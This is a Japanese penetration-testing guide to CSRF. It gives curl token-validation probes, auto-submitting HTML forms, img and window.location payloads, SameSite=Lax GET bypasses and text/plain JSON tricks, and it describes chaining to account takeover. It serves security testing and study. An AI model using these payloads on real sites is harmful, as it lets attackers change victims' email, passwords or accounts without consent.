# クロスサイトリクエストフォージェリ（CSRF）

> **スコープ**: 被害者のブラウザに保存されたセッションを使い、本人の意図しない状態変更リクエストを攻撃者サイトから送らせる脆弱性。トークン有無の確認〜検証不備の判定〜SameSite 属性による成立条件〜JSON / multipart での回避〜PoC 生成までを扱う。Cookie の窃取そのものは `XSS.md`、別オリジンからの読み取り（レスポンス窃取）は `CORS.md` を参照。

## 着火条件

- 状態変更を伴うリクエスト（パスワード変更・メールアドレス変更・送金・権限付与・設定変更）がある
- そのリクエストの認証が **Cookie だけ**で成立する（Authorization ヘッダーや独自ヘッダーを必須としない）
- リクエストに推測不能な CSRF トークンが無い、または有っても検証されていない

## 環境前提

- 実行環境: テスター端末（PoC HTML をホストし、被害者ブラウザで開かせる想定）/ 被害者ブラウザ（ログイン済みセッション）
- 必要なツール: `python3 -m http.server`（PoC HTML をホスト）/ Burp Suite（「Generate CSRF PoC」機能で雛形生成・標準搭載は Pro 版）/ ブラウザ
- オフライン環境では Burp の PoC 生成が使えれば最速。無ければ本ファイルの素の HTML フォーム雛形を手書きする

## 先に確認すること

- **認証がどのヘッダーで成立しているかを最初に判定する**: リクエストから `Cookie` 以外の認証要素（`Authorization: Bearer` / `X-Auth-Token` 等）を削って送り、まだ成立するかを見る。

| 削っても成立する要素 | CSRF 可否 |
|---|---|
| Cookie だけで成立（他ヘッダー不要）| CSRF 成立の前提が揃う → §1 へ |
| `Authorization: Bearer` 等が必須 | ブラウザが自動付与しない → CSRF 不成立（トークンは JS でしか付かない）|

**攻撃者の思考トレース:** CSRF は「ブラウザがリクエストに**自動で**付ける認証情報（＝Cookie）」に便乗する攻撃。だから最初に問うのは「このリクエストは Cookie だけで通るか」。通るなら次は「CSRF トークンがあるか・あっても検証が緩くないか」「SameSite 属性がクロスサイト送信を止めないか」を順に潰す。1つでも防御が欠ければ PoC を組む。

---

## 1. トークンの有無と検証強度の確認

**コマンド（Burp / curl での検証手順）:**

```bash
# [Attacker] ① トークンを丸ごと削って送る（パラメータ自体を消す）
curl -s -X POST http://[TARGET]/account/email -b "[SESSION_COOKIE]" \
  --data "email=attacker@example.invalid"

# [Attacker] ② トークンの値だけ別の適当な値に差し替えて送る
curl -s -X POST http://[TARGET]/account/email -b "[SESSION_COOKIE]" \
  --data "email=attacker@example.invalid&csrf=AAAAAAAA"

# [Attacker] ③ 別ユーザーで取得した有効なトークンを流用して送る
curl -s -X POST http://[TARGET]/account/email -b "[SESSION_COOKIE]" \
  --data "email=attacker@example.invalid&csrf=[OTHER_USER_VALID_TOKEN]"
```

**観測される出力 → 次のアクション:**

| 結果 | 示唆 | 次のアクション |
|---|---|---|
| ① トークン無しで成功 | トークン未実装 or 欠落時に検証しない | §2 PoC 生成へ（最も素直な CSRF）|
| ② 不正値で成功 | トークンを受け取るが検証していない | §2 へ（トークン欄に固定文字列を入れる PoC）|
| ③ 他人の有効トークンで成功 | トークンがセッションに紐付いていない（グローバル検証）| §2 へ（攻撃者が自分のトークンを埋め込む）|
| ①②③ すべて失敗 | トークンがセッション紐付きで検証されている | §3 SameSite / メソッド・Content-Type の緩さを確認 |

**注意:** リクエストメソッドを `POST` から `GET` に変えると検証が外れる実装がある（`GET /account/email?email=...`）。トークンが `POST` のみ検証なら GET 化でバイパスできる。`Referer` ヘッダーだけで検証している場合は §3 を参照。

---

## 2. PoC 生成（自動送信 HTML）

トークンが無い／検証されないと判明したら、被害者がログイン状態で開くだけで発火する HTML を作る。

**コマンド（PoC 雛形）:**

```html
<!-- [Attacker] application/x-www-form-urlencoded の自動送信フォーム -->
<!-- 被害者がログイン済みでこのページを開くと、ブラウザが自動で Cookie を付けて送信する -->
<html><body onload="document.forms[0].submit()">
  <form action="http://[TARGET]/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@example.invalid">
    <!-- 検証されないトークン欄がある場合は固定値を入れておく -->
    <input type="hidden" name="csrf" value="AAAAAAAA">
  </form>
</body></html>
```

```html
<!-- [Attacker] GET で状態変更できる場合は img 一発で発火（ユーザー操作不要・気付かれにくい） -->
<img src="http://[TARGET]/account/email?email=attacker@example.invalid">
```

**事前準備（必須）:** PoC をテスター端末でホストし、被害者に開かせる経路（リンク／格納型 XSS／メール）を用意する。

```bash
# [Attacker] PoC HTML をホスト
python3 -m http.server 8000
```

**観測される出力 → 次のアクション:**

| 結果 | 示唆 | 次のアクション |
|---|---|---|
| 被害者アカウントのメール／パスワードが変わる | CSRF 成立 | アカウント乗っ取りへ接続（リセット経路を攻撃者メールに向ける）|
| フォーム送信がブロックされる | SameSite or トークン or Content-Type 制約 | §3 へ |

**注意:** メールアドレス変更 → パスワードリセット要求の連鎖でアカウント乗っ取りに昇格できる。PoC は被害者の操作なしで `onload` 自動送信されるため、格納型 XSS（`XSS.md`）に PoC を仕込めば閲覧した管理者のリクエストを偽造できる（CSRF と XSS の連鎖）。

---

## 3. SameSite 属性と成立条件

ブラウザの SameSite Cookie 既定値が CSRF の成否を大きく左右する。トークンが無くても SameSite が効いていればクロスサイト送信で Cookie が付かず不発になる。逆に条件を満たせば SameSite=Lax でも成立する。

**観点（SameSite 別の成立条件）:**

| Cookie の SameSite | クロスサイトで Cookie が付くか | CSRF 成立条件 |
|---|---|---|
| `None`（+ Secure）| 付く（全リクエスト）| トークン防御が無ければ POST も GET も成立 |
| `Lax`（多くのブラウザの既定）| **トップレベルナビゲーションの GET のみ**付く | GET で状態変更できる、または `<form method=GET>` / リンク誘導なら成立。POST フォーム自動送信は不発 |
| `Strict` | 付かない | クロスサイト起点では不成立（同一サイト内 XSS 等が必要）|
| 属性なし（レガシー） | ブラウザ依存（新しめは Lax 相当に扱う）| Lax 相当として扱う |

**コマンド（SameSite=Lax を GET で攻める）:**

```html
<!-- [Attacker] Lax はトップレベル GET ナビゲーションで Cookie が付く →
     状態変更が GET で通るなら window.location 誘導で成立 -->
<script>window.location='http://[TARGET]/account/delete?confirm=1'</script>
```

**観測される出力 → 次のアクション:**

| 結果 | 示唆 | 次のアクション |
|---|---|---|
| `Lax` だが GET 状態変更が通った | トップレベル GET ナビゲーションで Cookie 付与 | GET ベース PoC（リンク／`window.location`）で成立 |
| `Strict` で全く付かない | クロスサイト起点不可 | 同一サイト内の XSS と連鎖（`XSS.md`）するか CSRF は断念 |
| Cookie に SameSite 属性が無い | レガシー or 明示設定漏れ | 新しめブラウザは Lax 相当・古い環境では None 相当。両にらみで GET/POST 両方試す |

**注意:** SameSite=Lax の「GET なら付く」例外は **トップレベルナビゲーション**（アドレスバー遷移・リンククリック相当）に限られ、`<img>` や `fetch` のサブリソース GET には付かない。Lax 環境では `window.location` 誘導や `<a>` リンクの形にする。新規発行から 2 分以内の Cookie は Lax でも POST に付く猶予（Lax+POST）挙動が一部ブラウザに残るが、依存しない。

---

## 4. Content-Type・JSON エンドポイントの回避

API が `application/json` を期待する場合、HTML フォームから送れる Content-Type は限られる（`application/x-www-form-urlencoded` / `multipart/form-data` / `text/plain`）。これを使って JSON 風ボディを送れることがある。

**コマンド（PoC）:**

```html
<!-- [Attacker] text/plain で JSON 風ボディを送る（サーバーが Content-Type を厳格検証しない場合） -->
<form action="http://[TARGET]/api/account" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@example.invalid","ignore":"' value='"}'>
</form>

<!-- [Attacker] fetch で送る場合（simple request に収める） -->
<script>
fetch('http://[TARGET]/api/account',{method:'POST',credentials:'include',
  headers:{'Content-Type':'text/plain'},
  body:'{"email":"attacker@example.invalid"}'});
</script>
```

**観測される出力 → 次のアクション:**

| 結果 | 示唆 | 次のアクション |
|---|---|---|
| `text/plain` の JSON 風ボディを受理 | Content-Type を厳格検証していない | §2 の PoC を JSON 用に組んで成立 |
| `Content-Type: application/json` 必須で拒否 | simple request で送れない | プリフライトが走る → CSRF 不成立（`CORS.md` の検討へ）|
| カスタムヘッダー必須（`X-Requested-With` 等）| JS でしか付けられない | クロスサイトからは不可 → CSRF 断念 |

**注意:** `Content-Type: application/json` を**必須かつ厳格に**検証していると、HTML フォームでは送れず（fetch で付けるとプリフライトが走り別オリジンからは止まる）CSRF は成立しない。これは事実上の CSRF 防御として機能する。逆に「JSON エンドポイントだから安全」と思い込んでいる実装が `text/plain` を受理してしまう誤りが狙い目。

---

## 刺さらなかったとき（全体）

| 観測される症状 | 推定原因 | 代替手段 |
|---|---|---|
| トークン削除・改変で全て失敗 | セッション紐付きトークンを検証 | §3 SameSite / GET 化 / Content-Type 緩さを順に確認 |
| SameSite=Strict で Cookie が付かない | クロスサイト起点不可 | 同一サイト XSS と連鎖（`XSS.md`）|
| JSON 必須で `text/plain` も拒否 | Content-Type 厳格検証 | CSRF 断念。別オリジンからの**読み取り**が要件なら `CORS.md` へ |
| `Authorization: Bearer` が必須 | Cookie 認証でない | ブラウザ自動付与されない → CSRF 対象外 |

---

## 注意点・落とし穴

- **CSRF の前提は「Cookie だけで認証が通ること」**: Bearer トークン認証の API は原則 CSRF 対象外（ブラウザが自動付与しないため）。最初にこの切り分けをする。
- **SameSite 既定値の変化**: 主要ブラウザは属性なし Cookie を Lax 相当に扱うようになった。古い「属性なし＝全送信」前提のテストは現行ブラウザで再現しないことがある。
- **トークンがあっても安心しない**: 「欠落時に検証しない」「値を検証しない」「セッションに紐付かない」の 3 つの実装ミスが頻出（§1 の①②③）。
- **GET での状態変更は SameSite=Lax を貫通する**: 状態変更を GET で許す設計は Lax 環境でも CSRF が成立する重大な設計ミス。
- **XSS があれば CSRF 防御は無意味になりがち**: 同一サイト内の XSS からはトークンを読めるため、XSS 連鎖は CSRF トークンを回避する（`XSS.md`）。
- **本番では被害者を実在の第三者にしない**: PoC の検証はテスト用アカウント間で行い、実ユーザーのデータを変更しない。

---

## 関連技術

- 前：状態変更リクエストと認証方式（Cookie のみか）を確認 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 前：Cookie 属性（SameSite / Secure）の一次トリアージ → `../../01_Reconnaissance/Web_Response_Triage.md`
- 後：メール／パスワード変更 CSRF → アカウント乗っ取り → `../Credential_Discovery.md`
- 関連：格納型 XSS に CSRF PoC を仕込む連鎖（トークン回避）→ `XSS.md`
- 関連：別オリジンからの**読み取り**（レスポンス窃取）が要件 → `CORS.md`
- 関連：OAuth の state 欠落による CSRF（IdP 連携の強制）→ `OAuth_Attacks.md`
- 関連：攻撃側の準備（PoC ホスト・到達可能 IP の確認）→ `../../06_Concepts/Reverse_Shell.md`
